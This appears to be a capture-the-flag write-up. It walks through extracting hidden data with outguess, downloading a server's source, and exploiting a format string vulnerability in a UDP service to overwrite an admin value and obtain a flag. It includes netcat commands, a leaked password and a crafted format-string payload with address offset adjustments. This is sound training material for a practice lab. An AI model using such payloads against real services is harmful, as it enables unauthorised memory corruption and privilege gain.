## Step 1: Steganography
First, we need to retrieve information from the "pict.jpg" using the outguess steganography function:
```bash
outguess -er kuraq_case/pict.jpg output1
```
Next, wget the obtained website to download the client and client_slave source code:
```bash 
wget -O output2 localhost:port  #(the port will be in output1)
```
here we need to find more information about the src code the output2 will contains a html page that cocontains information about the src code path 
```bash
cat output2 | grep backups-
```
You will find a port, for example, "backups-18184" in my case:

```bash
wget localhost:port/backups-18184 -> ca crée backups-18184
wget localhost:port/backups-18184/server.c 
wget localhost:port/backups-18184/server_slave.c
```

Alternatively, if the steps fail, the source code is provided in the directory.




after obtaining the source codes you need to copy and paste them in you local machine to compile them manually and see what you can do with them to hack the backland 

## Step 2: Compilation and Analysis
Firstly, create a folder "chroot" in the same directory as "server.c" and "server_slave.c" to fulfill one requirement.

For this challenge, it's recommended to download gdb peda as it's useful here.

Start by checking the port in the server.c where the server will listen. In my example, I found the port to be 38363.

Using the terminal (Ubuntu or WSL):
```bash
sudo gdb server 
r `pwd` 38363 
```
open another terminal and start to talk with the server xD 
example 
```bash
echo -ne Hello server |nc -u 127.0.0.1 38363
```
The source code mentions that the user needs to input a password. Fortunately, the password is revealed in the source code: "ZTI4ZmM1YjA0OTFhCg". Let's try in terminal 2:
```bash
echo -ne ZTI4ZmM1YjA0OTFhCg |nc -u 127.0.0.1 38363
```
Now we can write anything to the stack.

The "server_slave" code mentions that if "admin->val == 0xDEADBEEF", then the user will get privileged info. The purpose now is to change this value from its initial value of "0xCAFED00D" without affecting "admin->ttag" and "admin->btag," which need to remain as 0 to pass. This is a format string vulnerability.

Using this article, you can learn how to write anything wherever you want if you know the address: https://axcheron.github.io/exploit-101-format-strings/#writing-to-the-stack

Using gdb, try to identify the location of "0xCAFED00D" and attempt to change this value to "0xDEADBEEF".

I crafted an input to change this value: \x44\xd3\xff\xff\x46\xd3\xff\xff%48871x%21$hn%9199x%22$hn
I changed the client.c to do that thanks to the article and I made a fake private file that contains a fake flag and it works 

## Step3: Deploying the Attack
Now we need to deploy this attack on the challenge instance.

First, find the address offset between the challenge machine and the real machine.

On the real machine, find a random address using the format string vulnerability:

In terminal one:
```bash
sudo ./server `pwd` 38363
```

In terminal two: 

```bash

echo -ne ZTI4ZmM1YjA0OTFhCg |nc -u 127.0.0.1 38363
echo -ne %p |nc -u 127.0.0.1 38363  #to see an address from the stack 
```

memorize the address 
e.g: 0xff9e5900
Now go to the challenge machine 

do the same thing 
```bash
echo -ne ZTI4ZmM1YjA0OTFhCg |nc -u 127.0.0.1 38363
echo -ne %p |nc -u 127.0.0.1 38363  #to see an address from the stack 
```

memorize the address 
e.g : 0xff9e599d

compute the offset: 
0xff9e599d-0xff9e5900= 9d 


add this offset to all addresses and update the client.c compite it and run it in the challenge machine and you will obtain your flag !!!!


